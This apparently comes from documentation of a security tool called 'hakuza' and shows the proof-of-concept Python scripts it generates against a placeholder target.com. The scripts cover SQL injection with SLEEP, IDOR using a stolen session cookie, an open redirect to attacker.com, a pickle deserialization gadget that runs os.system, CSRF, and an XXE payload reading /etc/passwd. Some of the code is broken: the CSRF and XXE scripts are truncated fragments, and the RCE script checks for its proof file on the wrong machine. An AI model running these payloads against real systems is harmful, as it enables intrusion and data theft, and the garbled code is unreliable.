### Generated PoC (Python)
```python
#!/usr/bin/env python3
# PoC: sqli vulnerability reproduction (time-based blind)
# Parameter: tab
# Payload: 1' OR SLEEP(5) -- 
# Target: http://target.com/user/profile
# Generated by hakuza active

import sys
import time
import requests

URL = "http://target.com/user/profile"
PARAMS = {"tab": "1' OR SLEEP(5) -- "}
BASELINE_TIME = 0.3  # Normal response time
EXPECTED_DELAY = 5.0  # Should take 5+ seconds with sleep
VERIFY = True


def main() -> int:
    """Test if SLEEP() payload adds expected delay (proves SQLi)"""
    
    # Test 1: Normal response time
    try:
        start = time.time()
        resp = requests.get(URL, params={"tab": "1"}, timeout=15, verify=VERIFY)
        normal_time = time.time() - start
        print(f"[*] Baseline request: {normal_time:.2f}s")
    except requests.RequestException as exc:
        print(f"[FAIL] Baseline request failed: {exc}")
        return 1

    # Test 2: SLEEP payload
    try:
        start = time.time()
        resp = requests.get(URL, params=PARAMS, timeout=15, verify=VERIFY)
        injected_time = time.time() - start
        print(f"[*] Injected request: {injected_time:.2f}s")
    except requests.Timeout:
        print(f"[PASS] Request timed out (SLEEP executed)")
        return 0
    except requests.RequestException as exc:
        print(f"[FAIL] Injected request failed: {exc}")
        return 1

    # Test 3: Verify significant delay
    delay = injected_time - normal_time
    if delay >= EXPECTED_DELAY - 0.5:  # Allow 500ms margin
        print(f"[PASS] Response time increased by {delay:.2f}s (SLEEP executed)")
        return 0
    else:
        print(f"[FAIL] No significant delay detected ({delay:.2f}s < {EXPECTED_DELAY}s)")
        return 1


if __name__ == "__main__":
    sys.exit(main())
```

## Example 3: IDOR (Insecure Direct Object Reference)

### Finding
```json
{
    "title": "IDOR in /order/<uuid> - Access others' order details",
    "url": "http://target.com/order/3f2504e0-4f89-4e63-9a0c-0305e82c3301",
    "category": "idor",
    "severity": "high",
    "description": "No authorization check when retrieving order by UUID",
    "evidence": "Logged in as alice, can view bob's order (UUID: 7c9e6679-7425-40de-944b-e07fc1f90ae7) without permission",
    "impact": "Any authenticated user can view any order, revealing customer PII and payment data"
}
```

### Generated PoC (Python)
```python
#!/usr/bin/env python3
# PoC: idor vulnerability reproduction
# Parameter: order_uuid
# Payload: 7c9e6679-7425-40de-944b-e07fc1f90ae7 (unauthorized)
# Target: http://target.com/order/
# Generated by hakuza active

import sys
import requests

# Use alice's session
SESSION_COOKIE = "session_alice_abc123"

# Alice's own order (should work)
ALICE_ORDER = "3f2504e0-4f89-4e63-9a0c-0305e82c3301"
# Bob's order (should NOT work, but does)
BOB_ORDER = "7c9e6679-7425-40de-944b-e07fc1f90ae7"

# Signal that proves we accessed unauthorized data
SIGNAL = "bob"  # Order belongs to bob, not alice

BASE_URL = "http://target.com/order"
VERIFY = True


def main() -> int:
    session = requests.Session()
    session.cookies.set("session", SESSION_COOKIE)
    
    print("[*] Testing IDOR: Accessing Bob's order as Alice...")
    
    try:
        resp = session.get(f"{BASE_URL}/{BOB_ORDER}", timeout=15, verify=VERIFY)
    except requests.RequestException as exc:
        print(f"[FAIL] Request failed: {exc}")
        return 1
    
    print(f"Status: {resp.status_code}")
    
    if resp.status_code == 403 or resp.status_code == 404:
        print("[FAIL] Access denied (proper authorization)")
        return 1
    
    if resp.status_code == 200 and SIGNAL in resp.text.lower():
        print(f"[PASS] Successfully accessed Bob's order (IDOR confirmed)")
        print(f"Response excerpt: {resp.text[:200]!r}")
        return 0
    
    print("[FAIL] Could not access or identify Bob's order")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

### Generated PoC (Python)
```python
#!/usr/bin/env python3
# PoC: open_redirect vulnerability reproduction
# Parameter: url
# Payload: http://attacker.com
# Target: http://target.com/callback

import sys
import requests

URL = "http://target.com/callback"
PARAMS = {"url": "http://attacker.com"}
EXPECTED_REDIRECT = "attacker.com"

def main() -> int:
    try:
        # Don't follow redirects — we want to see the Location header
        resp = requests.get(URL, params=PARAMS, timeout=15, allow_redirects=False)
    except requests.RequestException as exc:
        print(f"[FAIL] Request failed: {exc}")
        return 1
    
    print(f"Status: {resp.status_code}")
    location = resp.headers.get("Location", "")
    print(f"Redirect Location: {location}")
    
    if resp.status_code in (301, 302, 303, 307, 308) and EXPECTED_REDIRECT in location:
        print(f"[PASS] Open redirect confirmed")
        return 0
    
    print(f"[FAIL] No redirect or unexpected target")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

## Example 5: Remote Code Execution via Deserialization

### Finding
```json
{
    "title": "RCE via Python pickle deserialization in /api/config",
    "url": "http://target.com/api/config",
    "category": "rce",
    "severity": "critical",

    "impact": "Complete server compromise"
```

### Generated PoC (Python)
```python
#!/usr/bin/env python3
# PoC: rce vulnerability reproduction (pickle deserialization)
# Target: http://target.com/api/config
# Generated by hakuza active

import sys
import pickle
import base64
import os
import requests

# Payload: execute 'touch /tmp/hakuza_pwned'
PAYLOAD_FILE = "/tmp/hakuza_pwned"

# Minimal pickle gadget (simulated — real payload would use ysoserial)
# This creates a minimal RCE proof via os.system()
class RCEGadget:
    def __reduce__(self):
        return (os.system, ("touch " + PAYLOAD_FILE,))

def main() -> int:
    try:
        # Create and serialize payload
        gadget = RCEGadget()
        payload_bytes = pickle.dumps(gadget)
        payload_b64 = base64.b64encode(payload_bytes).decode()
        
        # Send payload to vulnerable endpoint
        resp = requests.post(
            "http://target.com/api/config",
            json={"data": payload_b64},
            timeout=15,
        )
        
        print(f"Status: {resp.status_code}")
        
        # Check if file was created (proves RCE)
        if os.path.exists(PAYLOAD_FILE):
            print(f"[PASS] RCE executed (file {PAYLOAD_FILE} created)")
            os.unlink(PAYLOAD_FILE)  # Cleanup
            return 0
        else:
            print(f"[FAIL] Payload did not execute")
            return 1
            
    except Exception as exc:
        print(f"[FAIL] {exc}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
```

### Generated PoC (Python)
```python
#!/usr/bin/env python3
# PoC: csrf vulnerability reproduction
# Target: http://target.com/transfer

import sys
import requests

def main() -> int:

    session = requests.Session()
    session.cookies.set("session", VICTIM_COOKIE)
    
    try:
        # CSRF attack: transfer money without token

            TRANSFER_URL,

        print(f"[FAIL] Request failed: {exc}")
        return 1
    
    print(f"Status: {resp.status_code}")
    
    if resp.status_code == 200 and ("success" in resp.text.lower() or "transferred" in resp.text.lower()):
        print(f"[PASS] CSRF succeeded (transfer accepted without token)")
        return 0
    else:
        print(f"[FAIL] Transfer rejected (CSRF protection present)")
        return 1
```

### Generated PoC (Python)
```python
#!/usr/bin/env python3
# PoC: xxe vulnerability reproduction
# Target: http://target.com/process-xml

import sys
import requests

XXE_PAYLOAD = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
'''

def main() -> int:
    try:
        resp = requests.post(
            "http://target.com/process-xml",

        print(f"[FAIL] Request failed: {exc}")
        return 1
    
    print(f"Status: {resp.status_code}")
```
